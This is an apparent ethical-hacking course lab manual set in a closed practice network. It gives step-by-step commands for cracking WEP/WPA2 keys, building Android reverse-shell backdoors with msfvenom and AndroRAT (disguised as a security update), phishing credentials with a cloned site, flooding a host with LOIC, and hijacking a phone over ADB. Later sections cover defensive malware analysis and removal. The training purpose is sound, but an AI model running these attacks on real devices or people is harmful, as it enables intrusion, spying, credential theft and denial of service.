Lab 1: Perform Wireless Traffic Analysis
########

========
Task 1: Wi-Fi Packet Analysis using Wireshark
========

Here, we will use Wireshark to analyze captured Wi-Fi packets.

In order to capture wireless traffic, a wireless adapter is required and using an adapter in the iLabs environment is not possible, therefore, in this lab, we are using a sample capture file (WEPcrack-01.cap) to analyze wireless packets.

By default, Windows 11 machine selected, click Ctrl+Alt+Delete.

Alternatively, you can also click Ctrl+Alt+Delete button under Windows 11 machine thumbnail in the Resources pane or Click Ctrl+Alt+Delete button under Commands (thunder icon) menu.

By default, Admin user profile is selected, type Pa$$w0rd in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows 11 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

If Welcome to Windows wizard appears, click Continue and in Sign in with Microsoft wizard, click Cancel.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Click search icon search1Icon.jpg on the Desktop. Type wire in the search field,the Wireshark appears in the results, click open to lanch it.

Screenshot

The Wireshark Network Analyzer window appears.

In the menu bar, click File and click Open option from the drop-down list.

Screenshot

Wireshark: Open Capture File window appears, navigate to E:\CEH-Tools\CEHv12 Module 16 Hacking Wireless Networks\Sample Captures, select WEPcrack-01.cap and click Open.

Screenshot

The WEPcrack-01.cap file opens in Wireshark window showing you the details of the packet for analysis. Here you can see the wireless packets captured which were otherwise masked to look like ethernet traffic.

Here 802.11 protocol indicates wireless packets.

You can access the saved packet capture file anytime, and by issuing packet filtering commands in the Filter field, you can narrow down the packet search in an attempt to find packets containing sensible information.

In real time, attackers enforce packet capture and packet filtering techniques to capture packets containing passwords (only for websites implemented on HTTP channel), perform attacks such as session hijacking, and so on.

Similarly you can also analyze the WPA2crack-01.cap file for WPA packets.

Screenshot

This concludes the demonstration of how to analyze Wi-Fi packets using Wireshark.

Close all open windows and document all the acquired information.

You can also use other wireless traffic analyzers such as AirMagnet WiFi Analyzer PRO (https://www.netally.com), SteelCentral Packet Analyzer (https://www.riverbed.com), Omnipeek Network Protocol Analyzer (https://www.liveaction.com), CommView for Wi-Fi (https://www.tamos.com), and Capsa Portable Network Analyzer (https://www.colasoft.com) to analyze Wi-Fi traffic.

########
Lab 2: Perform Wireless Attacks
########

========
Task 1: Crack a WEP network using Aircrack-ng
========

In this task, we will use the Aircrack-ng suite to crack the WEP encryption of a network.

In order to capture wireless traffic, a wireless adapter is required and using an adapter in the iLabs environment is not possible, therefore, in this lab, we are using a sample capture file (WEPcrack-01.cap) to crack WEP key.

Click Parrot Security to switch to the Parrot Security machine.

Screenshot

In the login page, the attacker username will be selected by default. Enter password as toor in the Password field and press Enter to log in to the machine.

Screenshot

Navigate to the Places in the top-section of the window and click Desktop from the drop-down list.

If a Question pop-up window appears asking you to update the machine, click No to close the window.

2022-04-21_15-32-52.png

The Desktop window appears, navigate to the CEHv12 Module 16 Hacking Wireless Networks folder and copy Sample Captures and Wordlist folders.

To copy the folders, firstly select both the folders and then press Ctrl+C.

2022-04-21_15-35-19.png

Now, navigate to the Desktop and press Ctrl+V to paste the copied folders (Sample Captures and Wordlist). Close the Desktop window.

2022-04-21_15-36-36.png

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

2022-04-21_15-39-08.png

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

2022-04-21_15-40-41.png

In the Parrot Terminal window, type aircrack-ng '/home/attacker/Desktop/Sample Captures/WEPcrack-01.cap' and press Enter.

2022-04-21_15-42-47.png

By issuing the above command aircrack-ng will crack the WEP key of the CEHLabs as shown in the screenshot.

In real-life attacks, attackers will use this key to connect to the access point and joint the target network. Once they enter the target network, they can use scanning tools to scan for open devices, perform a vulnerability analysis, and then start exploiting any vulnerabilities they find.

2022-04-21_15-44-10.png

This concludes the demonstration of how to crack a WEP network using Aircrack-ng.

Close all open windows and document all the acquired information.

========
Task 2: Crack a WPA2 Network using Aircrack-ng
========

Task 2: Crack a WPA2 Network using Aircrack-ng
WPA2 is an upgrade to WPA; it includes mandatory support for Counter Mode with Cipher Block Chaining Message Authentication Code Protocol (CCMP), an AES-based encryption protocol with strong security. WPA2 has two modes of operation: WPA2-Personal and WPA2-Enterprise. Despite being stronger than both WEP and WPA, the WPA2 encryption method can also be cracked using various techniques and tools.

In this task, we will use the Aircrack-ng suite to crack a WPA2 network.

Before starting this task, you need to configure your access point router (CEHLabs) to work in WPA2-PSK (Pre-Shared Key) encryption mode. To do so, navigate to the router’s default IP address and change the authentication mode from WPA to WPA2-PSK, with the password as password1.

In order to capture wireless traffic, a wireless adapter is required and using an adapter in the iLabs environment is not possible, therefore, in this lab, we are using a sample capture file (WPA2crack-01.cap) to crack WPA key.

Ensure that Sample Captures and Wordlist folders are present at the location home/attacker/Desktop which we copied in the previous task. If not, then navigate to the CEHv12 Module 16 Hacking Wireless Networks folder on the Desktop, copy the Sample Captures and Wordlist folders and paste them at the location home/attacker/Desktop.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

In the Parrot Terminal window, type aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap' and press Enter. Here, the BSSID of the target is 20:E5:2A:E4:38:00.

-a is the technique used to crack the handshake, 2=WPA technique.
-b refers to bssid; replace with the BSSID of the target router.
-w stands for wordlist; provide the path to a wordlist.
Screenshot

The result appears, showing the WPA handshake packet captured with airodump-ng. The target access point’s password is cracked and displayed in plain text next to the message KEY FOUND!, as shown in the screenshot.

If the password is complex, aircrack-ng will take a long time to crack it.

Screenshot

This concludes the demonstration of how to crack a WPA2 network using Aircrack-ng.

Close all open windows and document all the acquired information.

You can also use other tools such as Elcomsoft Wireless Security Auditor (https://www.elcomsoft.com), Portable Penetrator (https://www.secpoint.com), WepCrackGui (https://sourceforge.net), Pyrit (https://github.com), and WepAttack (http://wepattack.sourceforge.net) to crack WEP/WPA/WPA2 encryption.

########
Module 17 - hacking mobile platforms
########

########
Lab 1: Hack Android Devices
########

========
Task 1: Hack an Android Device by Creating Binary Payloads using Parrot Security
========

In this task, we will use Metasploit to create a binary payload in Parrot Security to hack an Android device.

Click Parrot Security to switch to the Parrot Security machine.

Screenshot

In the login page, the attacker username will be selected by default. Enter password as toor in the Password field and press Enter to log in to the machine.

If a Parrot Updater pop-up appears at the top-right corner of Desktop, ignore and close it.

If a Question pop-up window appears asking you to update the machine, click No to close the window.

Screenshot

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

5dltyryx.jpg

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the Parrot Terminal window, type service postgresql start and press Enter to start the database service.

Screenshot

Type msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk and press Enter to generate a backdoor, or reverse meterpreter application.

This command creates an APK (Backdoor.apk) on Desktop under the Root directory. In this case, 10.10.1.13 is the IP address of the Parrot Security machine.

Screenshot

Now, share or send the Backdoor.apk file to the victim machine (in this lab, we are using the Android emulator as the victim machine).

In this task, we are sending the malicious payload through a shared directory, but in real-life cases, attackers may send it via an attachment in an email, over Bluetooth, or through some other application or means.

Execute the below commands to create a share folder and assign required permissions to it:

Type mkdir /var/www/html/share and press Enter to create a shared folder
Type chmod -R 755 /var/www/html/share and press Enter
Type chown -R www-data:www-data /var/www/html/share and press Enter
Now, type service apache2 start and press Enter to start the Apache web server.

Screenshot

Type cp /root/Desktop/Backdoor.apk /var/www/html/share/ and press Enter to copy the Backdoor.apk file to the location share folder.

Screenshot

Type msfconsole and press Enter to launch the Metasploit framework.

In msfconsole, type use exploit/multi/handler and press Enter.

Screenshot

Now, issue the following commands in msfconsole:

Type set payload android/meterpreter/reverse_tcp and press Enter.
Type set LHOST 10.10.1.13 and press Enter.
Type show options and press Enter. This command lets you know the listening port (in this case, 4444), as shown in the screenshot.
Screenshot

Type exploit -j -z and press Enter. This command runs the exploit as a background job.

Screenshot

Click Android to switch to the Android emulator machine.

If the Android machine is non-responsive then, click Commands icon from the top-left corner of the screen, navigate to Power --> Reset/Reboot machine.

If Reset/Reboot machine pop-up appears, click Yes to proceed.

1.png

In the Android Emulator GUI, click the Chrome icon on the lower section of the Home Screen to launch the browser

xeorbazd.jpg

In the address bar, type http://10.10.1.13/share and press Enter.

If a Browse faster. Use less data. notification appears, click No thanks.

If a pop up appears, click Allow.

The Index of /share page appears; click Backdoor.apk to download the application package file.

Screenshot

After the download finishes, a notification appears at the bottom of the browser window. Click Open to open the application.

If Chrome needs storage access to download files, a pop-up will appear; click Continue. If any pop-up appears stating that the file contains a virus, ignore the message and download the file anyway.

In Allow Chrome to access photos, media, and files on your device?, click ALLOW.

If a warning message appears at the lower section of the browser window, click OK or Download anyway.

Screenshot

Chrome pop-up appears as shown in screenshot click on SETTINGS.

Screenshot

Install unknown apps screen appears, Now turn on Allow from this source and click back.

Screenshot

A MainActivity screen appears; click Install.

Screenshot

After the application installs successfully, an App installed notification appears; click OPEN.

Blocked by play protect pop-up appears click INSTALL ANYAY

send app for scanning? pop-up appears click DON'T SEND

Screenshot

Click Parrot Security switch back to the Parrot Security machine. The meterpreter session has been opened successfully, as shown in the screenshot.

In this case, 10.10.1.14 is the IP address of the victim machine (Android Emulator).

Screenshot

Type sessions -i 1 and press Enter. The Meterpreter shell is launched as shown in the screenshot.

In this command, 1 specifies the number of the session.

Screenshot

Type sysinfo and press Enter. Issuing this command displays the information the target machine such as computer name, OS, etc.

Screenshot

Type ipconfig and press Enter to display the victim machine’s network interfaces, IP address (IPv4 and IPv6), MAC address, etc. as shown in the screenshot.

Screenshot

Type pwd and press Enter to view the current or present working directory on the remote (target) machine.

Screenshot

Type cd /sdcard to change the current remote directory to sdcard.

The cd command changes the current remote directory.

Now, type pwd and press Enter. You will observe that the present working directory has changed to sdcard, that is, /storage/emulated/0.

Screenshot

Now, still in the Meterpreter session, type ps and press Enter to view the processes running in the target system.

The list of running processes might differ in your lab environment.

Because of poor security settings and a lack of awareness, if an individual in an organization installs a backdoor file on their device, the attacker gains control of the device. The attacker can then perform malicious activities such as uploading worms, downloading data, and spying on the user’s keystrokes, which can reveal sensitive information related to the organization as well as the victim

...less
Screenshot

Close all open windows.

Click Android to switch to the Android machine.

On the Home Screen, swipe up to navigate to the applications.

Screenshot

In the applications section, long click on MainActivity application and click App info.

Screenshot

App info page appears, click UNINSTALL button to uninstall the application.

If a pop-up appears, click OK.

ppc.jpg

This concludes the demonstration of how to hack an Android device by creating binary payloads using Parrot Security.

Close all open windows and document all the acquired information.


========
Task 2: Harvest Users’ Credentials using the Social-Engineer Toolkit
========

In this task, we will sniff user credentials on the Android platform using SET.

Click Parrot Security to switch to the Parrot Security machine.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

egajuqzx.jpg

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

Type cd social-engineer-toolkit and press Enter to navigate to the setoolkit folder.

005.jpg

Now, type ./setoolkit and press Enter to launch Social-Engineer Toolkit.

006.jpg

The SET menu appears, as shown in the screenshot. Type 1 and press Enter to choose Social-Engineering Attacks

Screenshot

A list of options for Social-Engineering Attacks appears; type 2 and press Enter to choose Website Attack Vectors.

Screenshot

A list of options in Website Attack Vectors appears; type 3 and press Enter to choose Credential Harvester Attack Method.

Screenshot

Type 2 and press Enter to choose Site Cloner from the menu.

Screenshot

Type the IP address of the local machine (10.10.1.13) in the prompt for “IP address for the POST back in Harvester/Tabnabbing” and press Enter.

In this case, we are targeting the Parrot Security machine (IP address: 10.10.1.13). These details may vary in your lab environment.

Now, you will be prompted for the URL to be cloned; type the desired URL in “Enter the url to clone” and press Enter. In this task, we will clone the URL http://certifiedhacker.com/Online%20Booking/index.htm.

You can clone any URL of your choice.

Screenshot

If a Press {return} if you understand what we’re saying here message appears, press Enter.

If a message appears asking Do you want to attempt to disable Apache?, type y and press Enter.

The cloning of the website completes, a highlighted message appears. The credential harvester initiates, as shown in the screenshot.

Screenshot

Having successfully cloned a website, you must now send the IP address of your Parrot Security machine to a victim and try to trick him/her into clicking on the link.

Click Firefox icon from the top-section of the Desktop to launch a web browser window and open your email account (in this example, we are using Mozilla Firefox and Gmail, respectively). Log in, and compose an email.

You can log in to any email account of your choice.

After logging into your email account, click the Compose button in the left pane and compose a fake but enticing email to lure a user into opening the email and clicking on a malicious link.

A good way to conceal a malicious link in a message is to insert text that looks like a legitimate online ticket booking account URL (in this case), but that actually links to your malicious cloned certifiedhacker page.

Position the cursor where you wish to place the fake URL, then click the Insert link icon.

18a.jpg

In the Edit Link window, first type the actual address of your cloned site in the Web address field under the Link to section. Then, type the fake URL in the Text to display field. In this case, the actual address of our cloned certifedhacker site is http://10.10.1.13, and the text that will be displayed in the message is http://www.bookhotel.com/change_account_password; click OK.

19.jpg

The fake URL should appear in the message body, as shown in the screenshot.

Verify that the fake URL is linked to the correct cloned site: in Gmail, click the link; the actual URL will be displayed in a “Go to link” pop-up. Once verified, send the email to the intended user.

21.jpg

Click Android to switch to the Android machine.

In the Android Emulator GUI, click the Chrome icon on the lower section of the Home Screen to launch the browser

Screenshot

In the Google Chrome browser window, sign in to the email account to which you sent the phishing mail as an attacker. Open the email you sent previously and click to open the malicious link.

24.jpg

When the victim (you in this case) clicks the URL, a new tab opens up, and he/she will be presented with a replica of www.certifiedhacker.com.

The hotel booking page appears, scroll-down to the end of the page. Here, the victim will be prompted to enter his/her username and password into the form fields, which appear as they do on the genuine website. When the victim enters the Username and Password and clicks Login, the page shows an error, as shown in the second screenshot.

3fjb2pf5.jpg

Screenshot

Click Parrot Security to switch to the Parrot Security machine. In the terminal window, scroll down to find an Username and Password, displayed in plain text, as shown in the screenshot

21xt2yhy.jpg

This concludes the demonstration of how to phish user credentials using SET.

Close all open windows and document all the acquired information

========
Task 3: Launch a DoS Attack on a Target machine using Low Orbit Ion Cannon (LOIC) on the Android Mobile Platform
========

In this task, we will use LOIC on the Android mobile platform to launch a DoS attack on a target machine.

Click Android to switch to the Android machine.

Click Commands icon from the top-left corner of the screen, navigate to Power --> Reset/Reboot machine.

If Reset/Reboot machine pop-up appears, click Yes to proceed.

2020-06-15_09-32-34.png

After the machine reboots, on the Home screen, swipe from right to left to navigate to the second page of the Home screen.

k4jg1ygw.jpg

On the second page of the Home screen, click the Cx File Explorer app.

Screenshot

Cx File Explorer opens; click 10.10.1.11 from the Network tab and navigate to CEH-Tools --> CEHv12 Module 17 Hacking Mobile Platforms --> Android Hacking Tools --> Low Orbit Ion Cannon (LOIC).

Screenshot

Click the Low Orbit Ion Cannon LOIC_v1.3.apk file.

Screenshot

A Do you want to install this application? screen appears, click INSTALL.

Screenshot

The installation begins; on completion, an App installed notification appears; click OPEN to launch the app.

ntk3znqu.jpg

On the LOIC screen, we will set a target website or machine. In this task, we shall launch a DoS attack on 10.10.1.19 machine.

In the left pane, in the URL field, type 10.10.1.19 and click the GET IP button.

The IP address of the target machine is displayed under the Manual IP option, as shown in the screenshot.

wp2bufda.jpg

To launch the attack, first select the TCP radio button; in the right pane, enter 80 as the Port number and in the Threads field, enter 100. Then, click the Start button, as shown in the screenshot.

Screenshot

LOIC begins to flood the target website with TCP packets, which we will see by running Wireshark.

Click Windows Server 2019 switch to the Windows Server 2019 machine. Click Ctrl+Alt+Delete to activate the machine.

Alternatively, you can also click Ctrl+Alt+Delete button under Windows Server 2019 machine thumbnail in the Resources pane or Click Ctrl+Alt+Delete button under Commands (thunder icon) menu.

more...
By default, Admin user profile is selected, type Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows Server 2019 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

...less
Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

click on Type here to search type wire in search field the wireshark appears in the results double click to open it.

Screenshot

The Wireshark Network Analyzer opens; double-click on the primary network interface (in this case, Ethernet) to start capturing network traffic.

Screenshot

Wireshark starts capturing network packets. Note the huge number of packets coming from the attackers’ machine (in this case, Android, which has the IP address 10.10.1.14), as shown in the screenshot.

The packets from 10.10.1.14 are sent to the target machine (Windows Server 2019), whose IP address is 10.10.1.19.

Screenshot

Click the Stop capturing packets icon in the toolbar to stop the process.

Screenshot

Observe the huge number of packets sent in the Packets field at the bottom of the Wireshark window, as shown in screenshot

hr3g5uwh.jpg

You can experience a degrade in a performance of the target machine Windows Server 2019.

Click Android to switch to the Android machine and in the LOIC application click STOP button to stop the attack.

========
Task 4: Exploit the Android Platform through ADB using PhoneSploit
========

In this task, we will exploit the Android platform through ADB using the PhoneSploit tool.

We will target the Android machine (10.10.1.14) using the Parrot Security machine.

If the Android machine is non-responsive then, click Commands icon from the top-left corner of the screen, navigate to Power --> Reset/Reboot machine. If Reset/Reboot machine pop-up appears, click Yes to proceed.

Click Parrot Security to switch to the Parrot Security machine.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

xyn4yak4.jpg

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

Now, type cd PhoneSploit and press Enter to navigate to the PhoneSploit folder.

By default, the tool will be cloned in the root directory.

Screenshot

Type python3 -m pip install colorama and press Enter to install the dependency.

Here, the dependency is already present.

Screenshot

Now, type python3 phonesploit.py and press Enter to run the tool.

Screenshot

The PhoneSploit main menu options appear, as shown in the screenshot.

Screenshot

Type 3 and press Enter to select [3] Connect a new phone option.

When prompted to Enter a phones ip address, type the target Android device’s IP address (in this case, 10.10.1.14) and press Enter.

If you are getting Connection timed out error, then type 3 again and press Enter. If you do not get any option, then type 3 and press Enter again, until you get Enter a phones ip address option.

You will see that the target Android device (in this case, 10.10.1.14) is connected through port number 5555.

If you are unable to establish a connection with the target device, then press Ctrl+C and re-perform steps#7-10.

Screenshot

Now, at the main_menu prompt, type 4 and press Enter to choose Access Shell on a phone.

When prompted to Enter a device name, type the target Android device’s IP address (in this case, 10.10.1.14) and press Enter.

You can observe that a shell command line appears, as shown in the screenshot.

Screenshot

In the shell command line, type pwd and press Enter to view the present working directory on the target Android device.

In the results, you can observe that the PWD is the root directory.

Screenshot

Now, type ls and press Enter to view all the files present in the root directory.

Screenshot

Type cd sdcard and press Enter to navigate to the sdcard folder.

Screenshot

Type ls and press Enter to list all the available files and folders.

In this example, we will download an image file (images.jpeg) that we placed in the Android machine’s Download folder earlier; you can do the same before performing the next steps.

Screenshot

Type cd Download and press Enter to navigate to the Download folder.

Type ls and press Enter to list all the available files in the folder. In this case, we are interested in the images.jpeg file, which we downloaded earlier.

Note down the location of images.jpeg (in this example, /sdcard/Download/images.jpeg). We will download this file in later steps.

Screenshot

Type exit and press Enter to exit the shell command line and return to the main menu.

At the main_menu prompt, type 7 and press Enter to choose Screen Shot a picture on a phone.

When prompted to Enter a device name, type the target Android device’s IP address (in this case, 10.10.1.14) and press Enter.

When prompted to Enter where you would like the screenshot to be saved, type /home/attacker/Desktop as the location and press Enter. The screenshot of the target mobile device will be saved in the given location. Minimize the Terminal window.

Screenshot

Click Places in the top section of the Desktop; then, from the context menu, click Desktop.

You should see the downloaded screenshot of the targeted Android device (screen.png). Double-click it if you wish to view the screenshot.

Screenshot

Close the Desktop window and switch back to the Terminal window.

At the main_menu prompt, type 14 and press Enter to choose List all apps on a phone.

When prompted to Enter a device name, type the target Android device’s IP address (in this case, 10.10.1.14) and press Enter.

The result appears, displaying the installed apps on the target Android device, as shown in the screenshot.

Using this information, you can use other PhoneSploit options to either launch or uninstall any of the installed apps.

Screenshot

Now, at the main_menu prompt, type 15 and press Enter to choose Run an app. In this example, we will launch a calculator app on the target Android device.

Based on the information obtained in the previous step about the installed applications, you can launch any app of your choice.

When prompted to Enter a device name, type the target Android device’s IP address (in this case, 10.10.1.14) and press Enter.

To launch the calculator app, type com.android.calculator2 and press Enter.

Screenshot

After launching the calculator app on the target Android device, click Android to switch to the Android machine.

You will see that the calculator app is running, and that random values have been entered, as shown in the screenshot.

The entered values might differ in your lab environment.

Screenshot

Click Parrot Security to switch back to the Parrot Security machine. In the Terminal window, type p and press Enter to navigate to additional PhoneSploit options on the Next Page.

The result appears, displaying additional PhoneSploit options, as shown in the screenshot.

At the main_menu prompt, type 18 and press Enter to choose Show Mac/Inet information for the target Android device.

When prompted to Enter a device name, type the target Android device’s IP address (in this case, 10.10.1.14) and press Enter.

The result appears, displaying the Mac/Inet information of the target Android device.

Screenshot

Now, at the main_menu prompt, type 21 and press Enter to choose the NetStat option.

When prompted to Enter a device name, type the target Android device’s IP address (in this case, 10.10.1.14) and press Enter.

The result appears, displaying netstat information of the target Android device, as shown in the screenshot.

For demonstration purposes, in this task, we are exploiting the Android emulator machine. However, in real life, attackers use the Shodan search engine to find ADB-enabled devices and exploit them to gain sensitive information and carry out malicious activities.

Screenshot

In the same way, you can exploit the target Android device further by choosing other PhoneSploit options such as Install an apk on a phone, Screen record a phone, Turn The Device off, and Uninstall an app.

This concludes the demonstration of how to exploit the Android platform through ADB using PhoneSploit.

Document all the acquired information and close all open windows.


========
Task 5: Hack an Android Device by Creating APK File using AndroRAT
========

In this task, we will use AndroRAT to create an APK file to hack an Android device.

In the Parrot Security machine, click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Type cd AndroRAT and press Enter to navigate to the AndroRAT repository.

Screenshot

Type python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk and press Enter to create an APK file (here, SecurityUpdate.apk).

--build: is used for building the APK
-i: specifies the local IP address (here, 10.10.1.13)
-p: specifies the port number (here, 4444)
-o: specifies the output APK file (here, SecurityUpdate.apk)
You can observe that an APK file (SecurityUpdate.apk) is generated at the location /home/attacker/AndroRAT/.

Screenshot

Type cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/ and press Enter to copy the SecurityUpdate.apk file to the location share folder.

If the share folder does not exist, then execute the following commands to create a share folder and assign required permissions to it:

Type mkdir /var/www/html/share and press Enter to create a shared folder
Type chmod -R 755 /var/www/html/share and press Enter
Type chown -R www-data:www-data /var/www/html/share and press Enter
Type service apache2 start and press Enter to start an Apache web server.

Screenshot

Now, type python3 androRAT.py --shell -i 0.0.0.0 -p 4444 and press Enter to start listening to the victim's machine.

--shell: is used for getting the interpreter
-i: specifies the IP address for listening (here, 0.0.0.0)
-p: specifies the port number (here, 4444)
You can observe that AndroRAT starts waiting for a connection.

Screenshot

Click Android to switch to the Android emulator machine.

If the Android machine is non-responsive then, click the Commands icon from the top-left corner of the screen and navigate to Power --> Reset/Reboot machine.

If Reset/Reboot machine pop-up appears, click Yes to proceed.

1.png

In the Android Emulator GUI, click the Chrome icon on the lower section of the Home Screen to launch the browser

Screenshot

In the address bar, type http://10.10.1.13/share and press Enter.

If a Browse faster. Use less data. notification appears, click No thanks.

If a pop up appears, click Allow.

The Index of /share page appears; click SecurityUpdate.apk to download the application package file.

121wwwwwwwwww.png

If Chrome needs storage access to download files, a pop-up appears; click Continue. If any pop-up appears stating that the file contains a virus, ignore the message and download the file anyway.

In Allow Chrome to access photos, media, and files on your device?, click ALLOW.

In the warning message saying that the File might be harmful, click Download anyway

After the file downloads, File downloaded pop-up appears, click Open.

ssssss.png

Google Service Framework window appears, click INSTALL button to install the malicious app.

Screenshot

After the application is installed successfully, an App installed notification appears; click OPEN.

Blocked by play protect pop-up appears click INSTALL ANYAY

Send app for scanning? pop-up appears, click DON'T SEND

Screenshot

The malicious application starts running in the background without the victim being totally unaware of it.

Click Parrot Security switch back to the Parrot Security machine. The Interpreter session has been opened successfully, with a connection from the victim machine (10.10.1.14), as shown in the screenshot.

In this case, 10.10.1.14 is the IP address of the victim machine (Android Emulator).

Screenshot

In the Interpreter session, type help and press Enter to view the available commands in the opened session.

Screenshot

Now, type deviceInfo and press Enter to view the device related information.

Screenshot

Type getSMS inbox and press Enter to obtain a file containing SMSes from the inbox of a victim device.

This file is stored at the location /home/attacker/AndroRAT/Dumps.

Screenshot

Type getMACAddress and press Enter to view the MAC address of the victim's device.

Screenshot

In a similar manner, you can attempt to execute additional commands available in the list of help commands to gather more information on the target device.

Type exit and press Enter to terminate the Interpreter session.

Screenshot

This concludes the demonstration on hacking an Android device through APK file created using AndroRAT.

Close all open windows and document all acquired information.

You can also use other Android hacking tools such as NetCut (https://www.arcai.com), drozer (https://labs.f-secure.com), zANTI (https://www.zimperium.com), Network Spoofer (https://www.digitalsquid.co.uk), and DroidSheep (https://droidsheep.info) to hack Android devices.

########
Lab 2: Secure Android Devices using Various Android Security Tools
########

========
Task 1: Analyze a Malicious App using Online Android Analyzers
========

In this task, we will analyze a malicious app using various online Android analyzers.

In this lab, we will be analyzing the malicious file (Backdoor.apk), which we used in the previous lab to hack the target Android platform.

If the malicious file (Backdoor.apk) is missing then follow the steps given in Lab 1 Task 1 (Hack an Android Device by Creating Binary Payloads using Parrot Security) to re-create the file.

Click Android to switch to the Android machine, click the Google Chrome browser icon on the Home screen to launch Chrome.

Restart the machine, if it non-responsive.

Screenshot

In Chrome, type https://www.sisik.eu/apk-tool in the address bar and press Enter.

The Sixo Online APK Analyzer webpage loads, as shown in the screenshot.

If a cookie notification pop-up appears, click Got it!

Click the Drop APK here or click to select file field to upload an APK file from the device.

Sixo Online APK Analyzer allows you to analyze various details about Android APK files. It can decompile binary XML files and resources.

Screenshot

In the Choose an action pop-up, click Files.

If Chrome pop-up appears, click ALLOW.

Screenshot

The Downloads screen appears; double-click the Backdoor.apk file.

If you find yourself in a folder called Recent, navigate to the Downloads folder by clicking on the ellipse icon in the top-left corner.

chang1.jpg

The browser window reappears with the information about the uploaded file (Backdoor.apk), as shown in the screenshot.

Screenshot

Scroll down to the Requested Permissions section to view information regarding the app’s requested permissions.

When an app wants to access resources or various device capabilities, it typically must request permission from the user to do so. Some permissions are granted by the user when installing the app and some need to be confirmed later while the app is running. The requested permissions are declared in the app’s AndroidManifest.xml file.

Screenshot

Scroll down to the AndroidManifest.xml section, which consists of essential information about the APK file.

The manifest file contains important information about the app that is used by development tools, the Android system, and app stores. It contains the app’s package name, version information, declarations of app components, requested permissions, and other important data. It is serialized into a binary XML format and bundled inside the app’s APK file.

Screenshot

You can also scroll down to view information about the app’s APK Signature, App Source Code, etc.

This concludes the demonstration of analyzing a malicious app using online Android analyzers.

You can also use other online Android analyzers such as SandDroid (http://sanddroid.xjtu.edu.cn), and Apktool (http://www.javadecompilers.com), to analyze malicious applications.

Close all open windows and document all the acquired information.

You can also use other Android vulnerability scanners such as X-Ray 2.0 (https://duo.com), Vulners Scanner (https://play.google.com), Shellshock Scanner - Zimperium (https://play.google.com), Yaazhini (https://www.vegabird.com), and Quick Android Review Kit (QARK) (https://github.com) to analyze malicious apps for vulnerabilities.

Close all open windows and document all the acquired information.

========
Task 2: Secure Android Devices from Malicious Apps using Malwarebytes Security
========

In this task, we will secure an Android device from malicious applications using Malwarebytes Security.

In the Android machine, click Commands icon from the top-left corner of the screen, navigate to Power --> Reset/Reboot machine.

If Reset/Reboot machine pop-up appears, click Yes to proceed.

2020-06-15_09-32-34.png

After the machine reboots, swipe-up the home screen, which will show all apps. Click on the Malwarebytes app.

h32t0rse.jpg

Malwarebytes Security initializes. A Let’s get you started message appears; click the Get started button to proceed.

Screenshot

In the permissions window, click Give permission.

Screenshot

A system pop-up appears, asking for permission; click ALLOW.

Screenshot

Click the skip button under Already have a subscription as shown in screenshot.

gisrazgs.jpg

The Your device has issues! screen loads; click the SCAN NOW button under LAST DEVICE SCAN

Screenshot

Malwarebytes security begins a security scan, as shown in screenshot

Screenshot

A Threats screen appears. This will show you all the malware (if any) found on your device.

The number of malware found might differ when you perform the lab.

Click the Remove selected button to remove the detected malware from your device.

Screenshot

A confirmation pop-up appears; click OK to confirm the removal of the malware.

Screenshot

The Malwarebytes Scanner screen appears, notifying you that All items have been dealt with!.

If Share the love pop-up appears, click NOT NOW to proceed.

Screenshot

Click On-demand scan in the lower section of the Scanner window under Previous scans to view details of the scan.

Screenshot

The Scanning history screen appears, displaying the deleted malicious file, as shown in the screenshot.

Screenshot

This concludes the demonstration of how to secure Android devices from malicious apps using Malwarebytes Security.

You can use other mobile antivirus and anti-spyware tools such as AntiSpy Mobile (https://antispymobile.com), Spyware Detector - Spy Scanner (https://play.google.com), iAmNotified - Anti Spy System (https://iamnotified.com), and Privacy Scanner (AntiSpy) Free (https://play.google.com) to secure mobile devices from malicious apps.

Close all open windows and document all the acquired information.

########
Module 18 - IoT and OT Hacking
########

########
Lab 1 - Perform IoT Footprinting using Various Footprinting Techniques
########

========
Task 1: Gather Information using Online Footprinting Tools
========

UMfeRyn.#2NB%v_

The information regarding the target IoT and OT devices can be acquired using various online sources such as Whois domain lookup, advanced Google hacking, and Shodan search engine. The gathered information can be used to scan the devices for vulnerabilities and further exploit them to launch attacks.

